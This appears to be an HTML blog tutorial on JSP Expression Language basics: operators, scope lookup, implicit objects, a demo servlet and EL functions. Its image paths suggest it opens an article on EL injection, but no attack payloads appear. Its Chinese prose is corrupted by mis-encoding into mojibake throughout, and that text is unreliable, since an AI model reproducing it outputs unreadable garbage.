<ul>
<li>è·å–æ•°æ®ï¼šELè¡¨è¾¾å¼ä¸»è¦ç”¨äºæ›¿æ¢ JSP é¡µé¢ä¸­çš„è„šæœ¬è¡¨è¾¾å¼ï¼Œä»¥ä»å„ç§ç±»å‹çš„WebåŸŸä¸­æ£€ç´¢Javaå¯¹è±¡ã€è·å–æ•°æ®ï¼ˆæŸä¸ªWebåŸŸä¸­çš„å¯¹è±¡ï¼Œè®¿é—®JavaBeançš„å±æ€§ã€è®¿é—®Listé›†åˆã€è®¿é—®Mapé›†åˆã€è®¿é—®æ•°ç»„ï¼‰</li>
<li>æ‰§è¡Œè¿ç®—ï¼šåˆ©ç”¨ELè¡¨è¾¾å¼å¯ä»¥åœ¨JSPé¡µé¢ä¸­æ‰§è¡Œä¸€äº›åŸºæœ¬çš„å…³ç³»è¿ç®—ã€é€»è¾‘è¿ç®—å’Œç®—æœ¯è¿ç®—ï¼Œä»¥åœ¨JSPé¡µé¢ä¸­å®Œæˆä¸€äº›ç®€å•çš„é€»è¾‘è¿ç®—ï¼Œä¾‹å¦‚<code>$&#123;user==null&#125;</code></li>
<li><strong>è·å–Webå¼€å‘å¸¸ç”¨å¯¹è±¡</strong>ï¼šELè¡¨è¾¾å¼å®šä¹‰äº†ä¸€äº›éšå¼å¯¹è±¡ï¼Œåˆ©ç”¨è¿™äº›éšå¼å¯¹è±¡ï¼ŒWebå¼€å‘äººå‘˜å¯ä»¥å¾ˆè½»æ¾è·å¾—å¯¹Webå¸¸ç”¨å¯¹è±¡çš„å¼•ç”¨ï¼Œä»è€Œè·å¾—è¿™äº›å¯¹è±¡ä¸­çš„æ•°æ®</li>
<li><strong>è°ƒç”¨Javaæ–¹æ³•</strong>ï¼šELè¡¨è¾¾å¼å…è®¸ç”¨æˆ·å¼€å‘è‡ªå®šä¹‰ELå‡½æ•°ï¼Œä»¥åœ¨JSPé¡µé¢ä¸­é€šè¿‡ELè¡¨è¾¾å¼è°ƒç”¨Javaç±»çš„æ–¹æ³•</li>
</ul>
<p>ç”¨æ³•ï¼š</p>
<p>å…ˆé€šè¿‡ page æ ‡ç­¾è®¾ç½®ä¸å¿½ç•¥ EI è¡¨è¾¾å¼</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> isELIgnored<span class="token operator">=</span><span class="token string">"false"</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h2><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">$&#123;ELè¡¨è¾¾å¼&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ELè¡¨è¾¾å¼å’ŒJSPä»£ç ç­‰ä»·è½¬æ¢</p>
<h3 id="ä¸-è¿ç®—ç¬¦"><a href="#ä¸-è¿ç®—ç¬¦" class="headerlink" title="[ ]ä¸.è¿ç®—ç¬¦"></a>[ ]ä¸.è¿ç®—ç¬¦</h3><p>ELè¡¨è¾¾å¼æä¾›<code>.</code>å’Œ<code>[]</code>ä¸¤ç§è¿ç®—ç¬¦æ¥å­˜å–æ•°æ®</p>
<p>å½“è¦å­˜å–çš„å±æ€§åç§°ä¸­åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚<code>.</code>æˆ–<code>-</code>ç­‰å¹¶éå­—æ¯æˆ–æ•°å­—çš„ç¬¦å·ï¼Œå°±ä¸€å®šè¦ä½¿ç”¨<code>[]</code></p>
<p>egï¼š<code>$&#123;user.My-Name&#125;</code>åº”å½“æ”¹ä¸º<code>$&#123;user[&quot;My-Name&quot;]&#125;</code></p>
<p>å¦‚æœè¦<strong>åŠ¨æ€å–å€¼</strong>æ—¶ï¼Œå°±å¯ä»¥ç”¨<code>[]</code>æ¥åšï¼Œè€Œ<code>.</code>æ— æ³•åšåˆ°åŠ¨æ€å–å€¼</p>
<p>egï¼š<code>$&#123;sessionScope.user[data]&#125;</code>ä¸­ data æ˜¯ä¸€ä¸ªå˜é‡</p>
<hr>
<h3 id="empty"><a href="#empty" class="headerlink" title="empty"></a>empty</h3><p><code>empty</code> ç”¨æ¥åˆ¤æ–­ EL è¡¨è¾¾å¼ä¸­çš„å¯¹è±¡æˆ–è€…å˜é‡æ˜¯å¦ä¸ºç©ºã€‚è‹¥ä¸ºç©ºæˆ–è€… nullï¼Œè¿”å› trueï¼Œå¦åˆ™è¿”å› false</p>
<hr>
<h3 id="æ¡ä»¶è¡¨è¾¾å¼"><a href="#æ¡ä»¶è¡¨è¾¾å¼" class="headerlink" title="æ¡ä»¶è¡¨è¾¾å¼"></a>æ¡ä»¶è¡¨è¾¾å¼</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>æ¡ä»¶è¡¨è¾¾å¼<span class="token operator">?</span>è¡¨è¾¾å¼<span class="token number">1</span><span class="token operator">:</span>è¡¨è¾¾å¼<span class="token number">2</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>ä»¥<code>$&#123;username&#125;</code>ä¸ºä¾‹ï¼Œæ„æ€æ˜¯å–å‡ºæŸä¸€èŒƒå›´ä¸­åç§°ä¸º username çš„å˜é‡ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰æŒ‡å®šå“ªä¸€ä¸ªèŒƒå›´çš„usernameï¼Œæ‰€ä»¥å®ƒä¼šä¾åºä» Pageã€Requestã€Sessionã€Application èŒƒå›´æŸ¥æ‰¾ã€‚å‡å¦‚é€”ä¸­æ‰¾åˆ°usernameï¼Œå°±ç›´æ¥å›ä¼ ï¼Œä¸å†ç»§ç»­æ‰¾ä¸‹å»ï¼Œä½†æ˜¯å‡å¦‚å…¨éƒ¨çš„èŒƒå›´éƒ½æ²¡æœ‰æ‰¾åˆ°æ—¶ï¼Œå°±å›ä¼ <code>&quot;&quot;</code>ã€‚ï¼ˆæ³¨æ„æ˜¯ç©ºå­—ç¬¦ä¸²ï¼‰</p>
<p>ELè¡¨è¾¾å¼å±æ€§ï¼šå¯ä»¥å¯¹åº”jspä¸­çš„å¯¹è±¡</p>
<table>
<thead>
<tr>
<th>å±æ€§èŒƒå›´åœ¨ELä¸­çš„åç§°</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Page</td>
<td>PageScope</td>
</tr>
<tr>
<td>Request</td>
<td>RequestScope</td>
</tr>
<tr>
<td>Session</td>
<td>SessionScope</td>
</tr>
<tr>
<td>Application</td>
<td>ApplicationScope</td>
</tr>
</tbody></table>
<p>è¿™å››ä¸ªåŸŸå¯¹è±¡çš„ä½œç”¨èŒƒå›´å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240716124225515.png" alt="image-20240716124225515"></p>
<h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>ç°åœ¨å®šä¹‰ä¸€ä¸ªServlet</p>
<blockquote>
<p>è½¬å‘çš„ä½œç”¨ï¼šé€šè¿‡è½¬å‘ï¼Œæˆ‘ä»¬æ‰å¯ä»¥ä½¿ç”¨ request å¯¹è±¡ä½œä¸ºåŸŸå¯¹è±¡è¿›è¡Œæ•°æ®å…±äº«</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Band</span></span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/ElDemo1"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ElDemo</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//1. å‡†å¤‡æ•°æ®</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Band</span><span class="token punctuation">></span></span> bands <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Band</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"ç»“æŸä¹é˜Ÿ"</span><span class="token punctuation">,</span><span class="token string">"å­¤ç‹¬æ‘‡æ»š"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"Guitar Hero"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"MyGO!!!!!"</span><span class="token punctuation">,</span><span class="token string">"BanGDream It's MyGO!!!!!"</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"ä¸ºä»€ä¹ˆè¦æ¼”å¥æ˜¥æ—¥å½±ï¼"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"æœ‰åˆºæ— åˆº"</span><span class="token punctuation">,</span><span class="token string">"Girls Band Cry"</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token string">"å‡¸ğŸ˜„å‡¸"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//2. å­˜å‚¨åˆ°requeståŸŸä¸­</span>
        request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"bands"</span><span class="token punctuation">,</span>bands<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//3. è½¬å‘åˆ° el-demo.jsp</span>
        request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/el-demo.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>el-demo.jspï¼Œè¿™é‡Œé€šè¿‡ELè¡¨è¾¾å¼è·å–æ•°æ®</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; isELIgnored&#x3D;&quot;false&quot; %&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
    &lt;title&gt;EL Demo&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;table&gt;
    &lt;tr&gt;$&#123;bands&#125;&lt;&#x2F;tr&gt;
&lt;&#x2F;table&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åè®¿é—®&#x2F;ElDemo1æ¥å£ï¼Œæ˜¯å¯ä»¥è®¿é—®åˆ°æ•°æ®çš„</p>
<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240716191006924.png" alt="image-20240716191006924"></p>
<hr>
<h3 id="æ“ä½œç¬¦"><a href="#æ“ä½œç¬¦" class="headerlink" title="æ“ä½œç¬¦"></a>æ“ä½œç¬¦</h3><p>JSP è¡¨è¾¾å¼è¯­è¨€æä¾›ä»¥ä¸‹æ“ä½œç¬¦ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ˜¯ Java ä¸­å¸¸ç”¨çš„æ“ä½œç¬¦ï¼š</p>
<table>
<thead>
<tr>
<th>æœ¯è¯­</th>
<th>å®šä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>ç®—æœ¯å‹</td>
<td>+ã€-ï¼ˆäºŒå…ƒï¼‰ã€*ã€&#x2F;ã€divã€%ã€modã€-ï¼ˆä¸€å…ƒï¼‰</td>
</tr>
<tr>
<td>é€»è¾‘å‹</td>
<td>andã€&amp;&amp;ã€orã€åŒç®¡é“ç¬¦ã€!ã€not</td>
</tr>
<tr>
<td>å…³ç³»å‹</td>
<td>&#x3D;&#x3D;ã€eqã€!&#x3D;ã€neã€&lt;ã€ltã€&gt;ã€gtã€&lt;&#x3D;ã€leã€&gt;&#x3D;ã€geã€‚å¯ä»¥ä¸å…¶ä»–å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæˆ–ä¸å¸ƒå°”å‹ã€å­—ç¬¦ä¸²å‹ã€æ•´å‹æˆ–æµ®ç‚¹å‹æ–‡å­—è¿›è¡Œæ¯”è¾ƒã€‚</td>
</tr>
<tr>
<td>ç©º</td>
<td>empty ç©ºæ“ä½œç¬¦æ˜¯å‰ç¼€æ“ä½œï¼Œå¯ç”¨äºç¡®å®šå€¼æ˜¯å¦ä¸ºç©ºã€‚</td>
</tr>
<tr>
<td>æ¡ä»¶å‹</td>
<td>A ?B :Cã€‚æ ¹æ® A èµ‹å€¼çš„ç»“æœæ¥èµ‹å€¼ B æˆ– Cã€‚</td>
</tr>
</tbody></table>
<hr>
<h2 id="éšå¼å¯¹è±¡"><a href="#éšå¼å¯¹è±¡" class="headerlink" title="éšå¼å¯¹è±¡"></a>éšå¼å¯¹è±¡</h2><p>JSP è¡¨è¾¾å¼è¯­è¨€å®šä¹‰äº†ä¸€ç»„éšå¼å¯¹è±¡ï¼Œå…¶ä¸­è®¸å¤šå¯¹è±¡åœ¨ JSP scriplet å’Œè¡¨è¾¾å¼ä¸­å¯ç”¨ï¼š</p>
<table>
<thead>
<tr>
<th>æœ¯è¯­</th>
<th>å®šä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>pageContext</td>
<td>JSPé¡µçš„ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç”¨äºè®¿é—® JSP éšå¼å¯¹è±¡ï¼Œå¦‚è¯·æ±‚ã€å“åº”ã€ä¼šè¯ã€è¾“å‡ºã€servletContext ç­‰ã€‚ä¾‹å¦‚ï¼Œ<code>$&#123;pageContext.response&#125;</code>ä¸ºé¡µé¢çš„å“åº”å¯¹è±¡èµ‹å€¼ã€‚</td>
</tr>
</tbody></table>
<p>æ­¤å¤–ï¼Œè¿˜æä¾›å‡ ä¸ªéšå¼å¯¹è±¡ï¼Œå…è®¸å¯¹ä»¥ä¸‹å¯¹è±¡è¿›è¡Œç®€æ˜“è®¿é—®ï¼š</p>
<table>
<thead>
<tr>
<th>æœ¯è¯­</th>
<th>å®šä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>param</td>
<td>å°†è¯·æ±‚å‚æ•°åç§°æ˜ å°„åˆ°å•ä¸ªå­—ç¬¦ä¸²å‚æ•°å€¼ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getParameter (String name) è·å¾—ï¼‰ã€‚getParameter (String) æ–¹æ³•è¿”å›å¸¦æœ‰ç‰¹å®šåç§°çš„å‚æ•°ã€‚è¡¨è¾¾å¼<code>$&#123;param.name&#125;</code>ç›¸å½“äº <code>request.getParameter (name)</code>ã€‚</td>
</tr>
<tr>
<td>paramValues</td>
<td>å°†è¯·æ±‚å‚æ•°åç§°æ˜ å°„åˆ°ä¸€ä¸ªæ•°å€¼æ•°ç»„ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getParameter (String name) è·å¾—ï¼‰ã€‚å®ƒä¸ param éšå¼å¯¹è±¡éå¸¸ç±»ä¼¼ï¼Œä½†å®ƒæ£€ç´¢ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„è€Œä¸æ˜¯å•ä¸ªå€¼ã€‚è¡¨è¾¾å¼ <code>$&#123;paramvalues. name&#125;</code> ç›¸å½“äº <code>request.getParamterValues(name)</code>ã€‚</td>
</tr>
<tr>
<td>header</td>
<td>å°†è¯·æ±‚å¤´åç§°æ˜ å°„åˆ°å•ä¸ªå­—ç¬¦ä¸²å¤´å€¼ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getHeader(String name) è·å¾—ï¼‰ã€‚è¡¨è¾¾å¼ <code>$&#123;header.name&#125;</code> ç›¸å½“äº <code>request.getHeader(name)</code>ã€‚</td>
</tr>
<tr>
<td>headerValues</td>
<td>å°†è¯·æ±‚å¤´åç§°æ˜ å°„åˆ°ä¸€ä¸ªæ•°å€¼æ•°ç»„ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getHeaders(String) è·å¾—ï¼‰ã€‚å®ƒä¸å¤´éšå¼å¯¹è±¡éå¸¸ç±»ä¼¼ã€‚è¡¨è¾¾å¼<code>$&#123;headerValues.name&#125;</code>ç›¸å½“äº <code>request.getHeaderValues(name)</code>ã€‚</td>
</tr>
<tr>
<td>cookie</td>
<td>å°† cookie åç§°æ˜ å°„åˆ°å•ä¸ª cookie å¯¹è±¡ã€‚å‘æœåŠ¡å™¨å‘å‡ºçš„å®¢æˆ·ç«¯è¯·æ±‚å¯ä»¥è·å¾—ä¸€ä¸ªæˆ–å¤šä¸ª cookieã€‚è¡¨è¾¾å¼<code>$&#123;cookie.name.value&#125;</code>è¿”å›å¸¦æœ‰ç‰¹å®šåç§°çš„ç¬¬ä¸€ä¸ª cookie å€¼ã€‚å¦‚æœè¯·æ±‚åŒ…å«å¤šä¸ªåŒåçš„ cookieï¼Œåˆ™åº”è¯¥ä½¿ç”¨<code>$&#123;headerValues.name&#125;</code>è¡¨è¾¾å¼ã€‚</td>
</tr>
<tr>
<td>initParam</td>
<td>å°†ä¸Šä¸‹æ–‡åˆå§‹åŒ–å‚æ•°åç§°æ˜ å°„åˆ°å•ä¸ªå€¼ï¼ˆé€šè¿‡è°ƒç”¨ ServletContext.getInitparameter(String name) è·å¾—ï¼‰ã€‚</td>
</tr>
</tbody></table>
<p>é™¤äº†ä¸Šè¿°ä¸¤ç§ç±»å‹çš„éšå¼å¯¹è±¡ä¹‹å¤–ï¼Œè¿˜æœ‰äº›å¯¹è±¡å…è®¸è®¿é—®å¤šç§èŒƒå›´çš„å˜é‡ï¼Œå¦‚ Web ä¸Šä¸‹æ–‡ã€ä¼šè¯ã€è¯·æ±‚ã€é¡µé¢ï¼š</p>
<table>
<thead>
<tr>
<th>æœ¯è¯­</th>
<th>å®šä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>pageScope</td>
<td>å°†é¡µé¢èŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚ä¾‹å¦‚ï¼ŒEL è¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨<code>$&#123;pageScope.objectName&#125;</code>è®¿é—®ä¸€ä¸ª JSP ä¸­é¡µé¢èŒƒå›´çš„å¯¹è±¡ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>$&#123;pageScope .objectName. attributeName&#125;</code>è®¿é—®å¯¹è±¡çš„å±æ€§ã€‚</td>
</tr>
<tr>
<td>requestScope</td>
<td>å°†è¯·æ±‚èŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚è¯¥å¯¹è±¡å…è®¸è®¿é—®è¯·æ±‚å¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼ŒEL è¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨<code>$&#123;requestScope. objectName&#125;</code>è®¿é—®ä¸€ä¸ª JSP è¯·æ±‚èŒƒå›´çš„å¯¹è±¡ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>$&#123;requestScope. objectName. attributeName&#125;</code>è®¿é—®å¯¹è±¡çš„å±æ€§ã€‚</td>
</tr>
<tr>
<td>sessionScope</td>
<td>å°†ä¼šè¯èŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚è¯¥å¯¹è±¡å…è®¸è®¿é—®ä¼šè¯å¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼š<code>$&#123;sessionScope. name&#125;</code></td>
</tr>
<tr>
<td>applicationScope</td>
<td>å°†åº”ç”¨ç¨‹åºèŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚è¯¥éšå¼å¯¹è±¡å…è®¸è®¿é—®åº”ç”¨ç¨‹åºèŒƒå›´çš„å¯¹è±¡ã€‚</td>
</tr>
</tbody></table>
<p>ç”¨ä¸€ä¸ªdemoæ¥çœ‹ä¸€ä¸‹ï¼š</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.io.*,java.util.*&quot; %&gt;
&lt;%
    String title &#x3D; &quot;Accessing Request Param&quot;;
%&gt;
&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;&lt;% out.print(title); %&gt;&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;h3&gt;é€šè¿‡è®¿é—® pageContext å¯¹è±¡æ¥è®¿é—® request å¯¹è±¡ï¼Œä¾‹å¦‚è®¿é—®requestå¯¹è±¡ä¼ å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²&lt;&#x2F;h3&gt;
$&#123;pageContext.request.queryString&#125;
&lt;br&gt;


&lt;h3&gt;Scope å¯¹è±¡&lt;&#x2F;h3&gt;
&lt;!--pageContextæ²¡æœ‰å¯¹åº”æ–¹æ³•çš„è¯·å¯¼å…¥tomcat libç›®å½•ä¸‹çš„jsp-api.jar--&gt;
&lt;%
    pageContext.setAttribute(&quot;name&quot;,&quot;nina&quot;);
    request.setAttribute(&quot;name&quot;,&quot;momoka&quot;);
    session.setAttribute(&quot;user&quot;,&quot;tomo&quot;);
    application.setAttribute(&quot;user&quot;,&quot;rupa&quot;);
%&gt;

pageScope.name:$&#123;pageScope.name&#125;
&lt;br&gt;
requestScope.name : $&#123;requestScope.name&#125;
&lt;br&gt;
sessionScope.user : $&#123;sessionScope.user&#125;
&lt;br&gt;
applicationScope.user : $&#123;applicationScope.user&#125;
&lt;br&gt;


&lt;h3&gt;param å’Œ paramValues å¯¹è±¡&lt;&#x2F;h3&gt;
&lt;p&gt;$&#123;param[&quot;username&quot;]&#125;&lt;&#x2F;p&gt;
&lt;br&gt;


&lt;h3&gt;header å’Œ headerValues å¯¹è±¡&lt;&#x2F;h3&gt;
&lt;p&gt;$&#123;header[&quot;user-agent&quot;]&#125;&lt;&#x2F;p&gt;

&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719114356983.png" alt="image-20240719114356983"></p>
<hr>
<h2 id="ELä¸­çš„å‡½æ•°"><a href="#ELä¸­çš„å‡½æ•°" class="headerlink" title="ELä¸­çš„å‡½æ•°"></a>ELä¸­çš„å‡½æ•°</h2><p>ELå…è®¸æ‚¨åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨å‡½æ•°ã€‚è¿™äº›å‡½æ•°å¿…é¡»è¢«å®šä¹‰åœ¨è‡ªå®šä¹‰æ ‡ç­¾åº“ä¸­ã€‚å‡½æ•°çš„ä½¿ç”¨è¯­æ³•å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>ns<span class="token operator">:</span><span class="token function">func</span><span class="token punctuation">(</span>param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ns æŒ‡çš„æ˜¯å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ï¼Œfunc æŒ‡çš„æ˜¯å‡½æ•°çš„åç§°ï¼Œparam1 æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œparam2 æŒ‡çš„æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ¯”å¦‚ï¼Œæœ‰å‡½æ•° <code>fn:length</code>ï¼Œåœ¨ JSTL åº“ä¸­å®šä¹‰ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·æ¥è·å–ä¸€ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>fn<span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token string">"Get my length"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

